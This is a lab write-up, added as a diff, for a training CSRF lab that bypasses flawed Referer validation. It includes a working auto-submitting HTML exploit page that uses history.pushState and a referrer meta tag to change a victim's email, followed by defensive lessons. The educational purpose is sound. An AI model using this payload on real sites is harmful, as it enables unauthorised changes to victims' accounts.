@@ -1,0 +1,80 @@
+================================
+LAB: CSRF with broken Referer validation
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 12, 2026
+Lab URL: https://0ab000090402c9a380b50dc5002a00cf.web-security-academy.net
+Category: CSRF
+Level: Practitioner
+Objective: Use the exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address
+Description: The lab's email change functionality attempts to detect and block cross-domain requests using Referer validation, but the detection mechanism can be bypassed
+
+[RECONNAISSANCE]
+----------------
+Tested email change functionality at POST /my-account/change-email
+
+Legitimate request (with valid Referer):
+- Referer: https://0ab000090402c9a380b50dc5002a00cf.web-security-academy.net/my-account?id=wiener
+- Response: 302 Found (success)
+
+Cross-origin request (no valid Referer):
+- Origin: null
+- No Referer or different domain
+- Response: 400 Bad Request - "Invalid referer header"
+
+Conclusion: Endpoint validates Referer header to prevent CSRF
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Referer validation is implemented but uses flawed logic.
+
+Testing showed the application checks if the legitimate domain appears ANYWHERE in the Referer header, not if it's the actual origin domain.
+
+Bypass test:
+- Referer: https://exploit-server.net/exploit?0ab000090402c9a380b50dc5002a00cf.web-security-academy.net/my-account?id=wiener
+- Response: 302 Found (bypass successful)
+
+The validation accepts requests where the target domain is embedded in the query string of an attacker-controlled origin.
+
+[EXPLOITATION]
+--------------
+Created malicious HTML page on exploit server:
+
+<html>
+<head>
+    <meta name="referrer" content="unsafe-url">
+</head>
+<body>
+    <form action="https://0ab000090402c9a380b50dc5002a00cf.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="hacked@evil.com" />
+    </form>
+    <script>
+        history.pushState("", "", "/?0ab000090402c9a380b50dc5002a00cf.web-security-academy.net");
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+Exploitation flow:
+1. history.pushState() modifies browser URL to include victim domain in query string
+2. <meta referrer> tag forces full Referer including query string
+3. Form auto-submits with crafted Referer header
+4. Referer becomes: https://exploit-server.net/?0ab000090402c9a380b50dc5002a00cf.web-security-academy.net
+5. Validation passes because target domain found in Referer string
+6. Email changed successfully
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit to victim.
+Victim's email successfully changed via CSRF despite Referer validation being present.
+
+[LESSONS LEARNED]
+-----------------
+- Referer validation must check that the legitimate domain is the ORIGIN, not just present anywhere in the header
+- Substring matching on Referer headers is insufficient - attackers can embed domains in query parameters or paths
+- Proper CSRF defense requires anti-CSRF tokens, not just Referer/Origin validation
+- history.pushState() can manipulate client-side URL before requests are sent
+- The Referrer-Policy can be controlled by attackers via meta tags to leak full URLs
+- Defense in depth: combine tokens + SameSite cookies + proper Referer validation (strict origin check)
